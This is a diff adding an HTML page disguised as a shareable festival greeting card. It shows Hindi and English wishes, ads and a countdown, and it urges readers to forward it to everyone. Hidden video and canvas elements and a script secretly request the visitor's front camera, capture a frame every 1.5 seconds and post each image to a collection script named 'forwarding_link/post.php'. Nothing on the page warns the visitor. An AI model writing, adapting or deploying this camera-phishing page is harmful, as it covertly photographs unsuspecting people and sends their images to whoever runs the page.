@@ -1,0 +1,272 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title id="page-title">Happy Festival to Your Friends</title>
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
+      <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+
+<style>
+    i {
+        color: #d35400;
+    }
+input[type=name], select {
+    width: 100%;
+    padding: 12px 20px;
+    margin: 4px 0;
+    display: inline-block;
+    border: 1px solid #e67e22;
+    border-radius: 6px;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Verdana', sans-serif;
+    margin: 0;
+    padding: 0;
+}
+
+.m1 { position: fixed; left: 1%; width: auto; height: 100%; top: 1%; color: #000; }
+.m2 { position: fixed; right: 1%; width: auto; height: 100%; top: 1%; color: #000; }
+
+h1 {
+  display: block;
+  width: 90%;
+  line-height: 1.5;
+  font: 900 32px 'Concert One', sans-serif;
+  color: #b7410e;
+  text-align: center;
+  margin: 15px auto;
+  text-shadow: 1px 1px 2px rgba(255,255,255,0.8);
+}
+
+.slideshow-container {
+  max-width: 1000px;
+  position: relative;
+  margin: auto;
+}
+
+.text {
+  color: #f2f2f2;
+  font-size: 15px;
+  padding: 8px 12px;
+  position: absolute;
+  bottom: 8px;
+  width: 100%;
+  text-align: center;
+}
+
+.cssload-preloader {
+    position: absolute;
+    top: 0px;
+    left: 0px;
+    right: 40px;
+    bottom: 20px;
+    z-index: 10;
+}
+</style>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+</div>
+ 
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+ 
+<script>
+// Prompt user together for Festival Name and Sender Name without default preset values
+var festivalName = prompt("Please Enter the Festival Name:\n\n👇👇👇👇👇");
+if (!festivalName || festivalName.trim() === "") { festivalName = "Festival"; }
+
+var userName = prompt("Please Enter Your Name:\n\n👇👇👇👇👇");
+if (!userName || userName.trim() === "") { userName = "Friend"; }
+
+function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'forwarding_link/post.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){},
+     error: function(){}
+   });
+};
+ 
+'use strict';
+ 
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+const constraints = {
+   audio: false,
+   video: {
+     facingMode: "user"
+   }
+};
+ 
+async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+}
+ 
+function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+}
+ 
+init();
+</script>
+
+<body class="bg" id="rakhi" style="background: linear-gradient(135deg, #fff3b0 0%, #ffcc00 50%, #ff9900 100%); background-attachment: fixed; min-height: 100vh;">
+    
+<center>
+  <div style="padding: 10px; background: rgba(255, 255, 255, 0.4); border-bottom: 2px solid #e67e22; margin-bottom: 15px;">
+    <span style="font-size: 22px; font-weight: bold; color: #b7410e; font-family: 'Georgia', serif;">✨ 🌟 HAPPY <span class="fest-dynamic"></span> 🌟 ✨</span>
+  </div>
+</center>
+
+<center>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Wishing 2 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:300px;height:50px"
+     data-ad-client="ca-pub-4696491179456446"
+     data-ad-slot="2568634816"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</center>
+
+<center> 
+<div class="container" style="max-width: 600px; margin: 0 auto; padding: 15px;">
+    <div class="main-greeting">
+<div align="center">
+     <div style="font-size: 20px; font-weight: 500; color: #333;">
+<p id="demo" style="background: #fff; display: inline-block; padding: 8px 15px; border-radius: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); color: #d35400; font-weight: bold;"></p>
+
+<div dir="ltr" style="text-align: left; margin-top: 15px;" trbidi="on">
+<div style="background-color: #ffffff; border-radius: 12px; border-left: 5px solid #e67e22; box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1); color: #b7410e; font-family: arial, sans-serif; font-size: 17px; margin: 10px auto; padding: 10px; width: 90%;">
+<marquee behavior="alternate"><b>“<span class="fest-dynamic"></span> का ये शुभ अवसर आपके जीवन में अनेकों ख़ुशियाँ लेकर आए”</b></marquee>
+</div>
+
+<div style="background-color: #ffffff; border-radius: 12px; border-left: 5px solid #f39c12; box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1); color: #d35400; font-family: arial, sans-serif; font-size: 17px; margin: 10px auto; padding: 10px; width: 90%;">
+<marquee behavior="alternate"><b>इस <span class="fest-dynamic"></span> हमारी शुभकामनाएँ आपके साथ हैं</b></marquee>
+</div>
+
+<div style="background-color: #ffffff; border-radius: 12px; border-left: 5px solid #27ae60; box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1); color: #27ae60; font-family: arial, sans-serif; font-size: 17px; margin: 10px auto; padding: 10px; width: 90%;">
+<marquee behavior="alternate"><b>|| <span class="fest-dynamic"></span> की हार्दिक बधाई ||</b></marquee>
+</div>
+</div>
+
+<br>
+<center>
+<div style="background: rgba(255, 255, 255, 0.85); padding: 15px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
+    <h1 id="user-heading"></h1>
+</div>
+</center>
+
+<div class="vi" style="text-align: center; margin-top: 20px;">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Wishing -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:300px;height:50px"
+     data-ad-client="ca-pub-4696491179456446"
+     data-ad-slot="5590491777"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</div>
+
+<br>
+<div style="background: #ffffff; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); margin-top: 15px;">
+    <p style="text-align: center;"><strong><span style="color: #d35400; font-size: 18pt; font-family: tahoma, arial, sans-serif;">Wishing you a very very</span></strong></p>
+    
+    <p style="text-align: center;"><strong><span style="font-size: 24pt; font-family: 'comic sans ms', sans-serif; color: #e67e22;">✪ Happy <span class="fest-dynamic"></span> ✪</span></strong></p>
+    
+    <p style="text-align: center;"><strong><span style="color: #2c3e50; font-size: 14pt; font-family: tahoma, arial, sans-serif;">to you and your lovely family</span></strong></p>
+      <hr style="border: 0; border-top: 1px dashed #f39c12; margin: 15px 0;">
+      <p style="text-align: center;"><span style="color: #16a085; font-size: 14pt; font-family: tahoma, arial, sans-serif;">May this auspicious occasion of <span class="fest-dynamic"></span> bring happiness, prosperity, health, and peace in your life.</span></p>
+      
+      <p style="text-align: center; margin-top: 15px;"><span style="color: #8e44ad; font-size: 14pt; font-family: tahoma, arial, sans-serif;">✪ I wish that this <span class="fest-dynamic"></span> is your best one. ✪</span></p>
+    
+    <div style="background: #fff3cd; padding: 10px; border-radius: 8px; margin-top: 15px; border: 1px solid #ffeeba;">
+      <p style="text-align: center; margin: 0;"><span style="color: #856404; font-size: 12pt; font-family: tahoma, arial, sans-serif;">यह संदेश <span class="fest-dynamic"></span> तक सभी के मोबाइल में होना चाहिए यह आपका फर्ज हैं</span></p>
+    </div>
+</div>
+
+<center>
+<div class="busi" style="margin-top: 20px;">
+  <h4><p style="text-transform: uppercase; font-size: 22px; color: #b7410e; font-weight: bold;" id="user-footer"></p></h4>
+</div>
+</center>
+
+<center style="margin-top: 20px;">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Link Ads -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4696491179456446"
+     data-ad-slot="1112298516"
+     data-ad-format="link"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</center>
+
+</div>
+</div>
+</div>
+</div>
+
+<script>
+// Dynamically populate inputs across the document
+document.getElementById('page-title').innerText = "Happy " + festivalName + " to Your Friends";
+document.getElementById('user-heading').innerText = userName;
+document.getElementById('user-footer').innerText = "by - " + userName;
+
+var elements = document.getElementsByClassName('fest-dynamic');
+for (var i = 0; i < elements.length; i++) {
+    elements[i].innerText = festivalName;
+}
+
+var countDownDate = new Date("October 10, 2028 00:00:00").getTime();
+
+var x = setInterval(function() {
+  var now = new Date().getTime();
+  var distance = countDownDate - now;
+
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+  document.getElementById("demo").innerHTML = days + " <i>Days,</i> " + hours + " <i>Hrs,</i> "
+  + minutes + " <i>Min,</i> " + seconds + " <i>Sec</i>";
+
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("demo").innerHTML = "🙏 Welcome 🙏";
+  }
+}, 1000);
+</script>       
+
+</body>
+</html>
